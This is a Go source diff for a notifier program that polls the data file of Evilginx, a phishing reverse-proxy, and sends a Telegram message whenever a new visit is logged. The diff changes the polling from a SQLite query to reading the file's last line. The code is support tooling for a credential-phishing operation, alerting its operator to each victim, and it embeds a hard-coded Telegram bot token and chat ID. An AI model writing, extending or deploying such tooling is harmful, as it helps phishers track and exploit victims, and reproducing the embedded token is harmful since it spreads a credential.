@@ -1,14 +1,13 @@
 package main
 
 import (
-    "database/sql"
+    "bufio"
     "fmt"
     "log"
     "net/http"
     "net/url"
+    "os"
     "time"
-
-    _ "github.com/mattn/go-sqlite3"
 )
 
 func sendTelegram(botToken, chatID, message string) {
@@ -24,18 +23,30 @@ func sendTelegram(botToken, chatID, message string) {
     }
 }
 
+// Read last line of the file
+func readLastLine(path string) (string, error) {
+    file, err := os.Open(path)
+    if err != nil {
+        return "", err
+    }
+    defer file.Close()
+
+    scanner := bufio.NewScanner(file)
+    var last string
+
+    for scanner.Scan() {
+        last = scanner.Text()
+    }
+
+    return last, scanner.Err()
+}
+
 func main() {
-    // ADD YOUR TOKEN + CHAT ID BEFORE PUSHING
+    // Your Telegram bot info
     botToken := "8471535230:AAFtKZ2V4zkcCW6yTHs1rGrdb9waaiDQzIQ"
     chatID := "7600034451"
 
-    dbPath := "/root/.evilginx/data.db"
-
-    db, err := sql.Open("sqlite3", dbPath)
-    if err != nil {
-        log.Fatalf("Failed to open DB: %v", err)
-    }
-    defer db.Close()
+    dbPath := "/root/.evilginx/data.db" // TEXT FILE, NOT REAL DB
 
     var lastTimestamp string
 
@@ -43,26 +54,19 @@ func main() {
     fmt.Println("Watching DB:", dbPath)
     fmt.Println("----------------------------------------")
 
+    // Initialize last known timestamp from file
+    lastTimestamp, _ = readLastLine(dbPath)
+
     for {
-        rows, err := db.Query("SELECT timestamp FROM logs ORDER BY timestamp DESC LIMIT 1")
+        current, err := readLastLine(dbPath)
         if err != nil {
-            log.Printf("Query error: %v", err)
+            log.Printf("Read error: %v\n", err)
             time.Sleep(3 * time.Second)
             continue
         }
 
-        var ts string
-        if rows.Next() {
-            rows.Scan(&ts)
-        }
-        rows.Close()
-
-        if lastTimestamp == "" {
-            lastTimestamp = ts
-        }
-
-        if ts != "" && ts != lastTimestamp {
-            msg := fmt.Sprintf("New Visit → Timestamp: %s", ts)
+        if current != "" && current != lastTimestamp {
+            msg := fmt.Sprintf("New Visit → Timestamp: %s", current)
 
             // Terminal display
             fmt.Println(msg)
@@ -70,7 +74,7 @@ func main() {
             // Telegram message
             sendTelegram(botToken, chatID, msg)
 
-            lastTimestamp = ts
+            lastTimestamp = current
         }
 
         time.Sleep(3 * time.Second)
